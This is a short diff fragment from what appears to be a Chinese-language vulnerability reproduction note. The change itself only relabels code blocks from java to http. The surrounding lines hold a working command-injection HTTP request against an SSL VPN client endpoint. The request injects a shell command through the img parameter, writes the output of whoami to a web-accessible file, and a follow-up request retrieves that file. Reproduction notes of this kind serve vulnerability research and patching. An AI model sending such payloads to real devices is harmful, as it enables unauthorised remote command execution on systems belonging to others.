@@ -68,7 +68,7 @@ schema_version: "1"
 + 特征
 
 # 四、漏洞复现
-```java
+```http
 GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
 Host: xx.xx.xx.xx
@@ -79,7 +79,7 @@ Connection: close
 
 获取命令执行结果
 
-```java
+```http
 GET /sslvpn/ceshi.txt HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
 Host: xx.xx.xx.xx
